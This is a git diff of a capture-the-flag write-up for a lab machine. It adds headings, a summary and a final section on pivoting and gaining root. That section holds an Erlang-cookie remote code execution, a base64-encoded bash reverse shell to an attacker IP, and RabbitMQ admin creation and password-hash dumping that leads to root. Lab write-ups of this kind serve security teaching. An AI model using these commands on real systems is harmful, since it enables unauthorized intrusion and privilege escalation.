@@ -5,7 +5,11 @@ title: RabbitStore
 
 ## TL;DR
 
+In this challenge, we send another parameter while registering, and then get admin access.
 
+Next, we find hidden endpoint on port `3000` and exploit `SSTI` to get `RCE`.
+
+We find `erlang` cookie and move to `rabbitmq`, and then escalate to root using hash we find while being `rabbitmq`.
 
 ### Recon
 
@@ -31,7 +35,7 @@ Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 I added `cloudsite.thm` to my `/etc/hosts` file, because it looks like this is the hostname.
 
-### ..
+### Bypass active check by adding parameter while register
 
 I used `ffuf` to enumerate endpoints.
 ```bash
@@ -144,7 +148,7 @@ And then tried to log in with the user I just created:
 
 It worked! our subscription is active.
 
-### ...
+### Find hidden endpoint on hidden port
 
 Now, we can see there is some upload box, I tried to upload webshell.
 
@@ -260,6 +264,8 @@ GET Requests:
 Note: All requests to this endpoint are sent in JSON format.
 ```
 
+### SSTI in /api/fetch_messeges_from_chatbot to RCE
+
 We find the a new endpoint `/api/fetch_messeges_from_chatbot`, let's send simple request:
 
 ![raw endpoint](image-17.png)
@@ -308,15 +314,115 @@ azrael@forge:~$ cat user.txt
 
 ![user flag](image-23.png)
 
-### Privilege Escalation to Root
+### Moving to rabbit using erlang cookie found
 
 I executed linpeas, and find this erlang cookie
 ```bash
 ╔══════════╣ Analyzing Erlang Files (limit 70)
--r-----r-- 1 rabbitmq rabbitmq 16 Nov 23 20:43 /var/lib/rabbitmq/.erlang.cookie                                                                                                              
-bBAOuPnJJ2JjpA3f
+-r-----r-- 1 rabbitmq rabbitmq 16 Nov 30 20:48 /var/lib/rabbitmq/.erlang.cookie
+86JdobYqveGisfEl
 ```
 
 ![erlang cookie](image-27.png)
 
+Using [https://malicious.link/posts/2018/erlang-arce/](https://malicious.link/posts/2018/erlang-arce/), I learnt how to set up remote node, and execute commands using the erlang cookie.
 
+First, on the remote machine we can see the hostname is `forge` and the node is `rabbit`
+```bash
+azrael@forge:/var/lib/rabbitmq$ epmd -names
+epmd: up and running on port 4369 with data:
+name rabbit at port 25672
+azrael@forge:/var/lib/rabbitmq$ hostname
+forge
+```
+
+![find names](image-25.png)
+
+Next, we can install erlang on our local machine
+```bash
+apt install erlang
+```
+
+Next, we'll add `forge` to our `/etc/hosts`, and execute this command:
+```bash
+erl -sname mine_node -setcookie '86JdobYqveGisfEl' -remsh rabbit@forge
+```
+
+we can now exeucte commands, for example, using `rpc:call('rabbit@forge', os, cmd, ["id"]).`:
+```bash
+(rabbit@forge)2> rpc:call('rabbit@forge', os, cmd, ["id"]).
+"uid=124(rabbitmq) gid=131(rabbitmq) groups=131(rabbitmq)\n"
+```
+
+![RCE](image-26.png)
+
+I pasted the payload from penelope:
+```bash
+printf KGJhc2ggPiYgL2Rldi90Y3AvMTkyLjE2OC4xMzIuMTY4LzQ0NDQgMD4mMSkgJg==|base64 -d|bash
+```
+and got reverse shell as `rabbitmq`
+
+![shell as rabbitmq](image-28.png)
+
+### Privilege Escalation to Root using hash grabbing
+
+First, I tried to list users using the command:
+```bash
+rabbitmqctl  list_users
+```
+
+I got the error `./.erlang.cookie`.
+So, I just changed the permissions:
+```bash
+cd ~
+chmod 700 ~/.erlang.cookie
+```
+
+and now list the users:
+```bash
+rabbitmq@forge:~$ rabbitmqctl list_users
+Listing users ...
+user    tags
+The password for the root user is the SHA-256 hashed value of the RabbitMQ root user's password. Please don't attempt to crack SHA-256. []
+root    [administrator]
+```
+
+![list-users](image-29.png)
+
+We can create another administator user, and then fetch all definitions include hashes from the internal api.
+```bash
+rabbitmqctl add_user elicopter elicopter ## add user elicopter with password elicopter
+rabbitmqctl set_permissions -p / elicopter ".*" ".*" ".*"
+rabbitmqctl set_user_tags elicopter administrator
+rabbitmqctl list_users # view users
+
+curl -u elicopter:elicopter -X GET http://localhost:15672/api/definitions
+```
+
+![get root hash](image-30.png)
+
+```bash
+rabbitmq@forge:~$ curl -u elicopter:elicopter -X GET http://localhost:15672/api/definitions
+{"rabbit_version":"3.9.13","rabbitmq_version":"3.9.13","product_name":"RabbitMQ","product_version":"3.9.13","users":[{"name":"elicopter","password_hash":"JwKmx1PAMg9eXHaZqRl1gil+7GeELgej+hmORGMW1dzEj3WH","hashing_algorithm":"rabbit_password_hashing_sha256","tags":["administrator"],"limits":{}},{"name":"The password for the root user is the SHA-256 hashed value of the RabbitMQ root user's password. Please don't attempt to crack SHA-256.","password_hash":"vyf4qvKLpShONYgEiNc6xT/5rLq+23A2RuuhEZ8N10kyN34K","hashing_algorithm":"rabbit_password_hashing_sha256","tags":[],"limits":{}},{"name":"root","password_hash":"49e6hSldHRaiYX329+ZjBSf/Lx67XEOz9uxhSBHtGU+YBzWF","hashing_algorithm":"rabbit_password_hashing_sha256","tags":["administrator"],"limits":{}},{"name":"myuser","password_hash":"d9xQoTetLfcmnjUPDokpoO750tdqUaxsTXQ/Sm3/W/ChfC0d","hashing_algorithm":"rabbit_password_hashing_sha256","tags":["administrator"],"limits":{}}],"vhosts":[{"name":"/"}],"permissions":[{"user":"myuser","vhost":"/","configure":".*","write":".*","read":".*"},{"user":"elicopter","vhost":"/","configure":".*","write":".*","read":".*"},{"user":"root","vhost":"/","configure":".*","write":".*","read":".*"}],"topic_permissions":[{"user":"root","vhost":"/","exchange":"","write":".*","read":".*"}],"parameters":[],"global_parameters":[{"name":"cluster_name","value":"rabbit@forge"},{"name":"internal_cluster_id","value":"rabbitmq-cluster-id-JVvInsfJs-N_wll9ptLLoQ"}],"policies":[],"queues":[{"name":"tasks","vhost":"/","durable":true,"auto_delete":false,"arguments":{}}],"exchanges":[],"bindings":[]}
+```
+
+Now, we need to transform the string `49e6hSldHRaiYX329+ZjBSf/Lx67XEOz9uxhSBHtGU+YBzWF` to normal hash.
+
+Using [https://github.com/qkaiser/cottontail/issues/27#issuecomment-1608711032](https://github.com/qkaiser/cottontail/issues/27#issuecomment-1608711032)
+
+```bash
+┌──(agonen㉿kali)-[~/thm/RabbitStore]
+└─$ echo '49e6hSldHRaiYX329+ZjBSf/Lx67XEOz9uxhSBHtGU+YBzWF' | base64 -d | xxd -pr -c128 | perl -pe 's/^(.{8})(.*)/$2:$1/'
+295d1d16a2617df6f7e6630527ff2f1ebb5c43b3f6ec614811ed194f98073585:e3d7ba85
+```
+
+![formating](image-31.png)
+
+I tried to `su root` with the password `295d1d16a2617df6f7e6630527ff2f1ebb5c43b3f6ec614811ed194f98073585`, and it worked.
+
+![root flag](image-32.png)
+
+```bash
+root@forge:~# cat root.txt 
+eabf7a0b05d3f2028f3e0465d2fd0852
+```
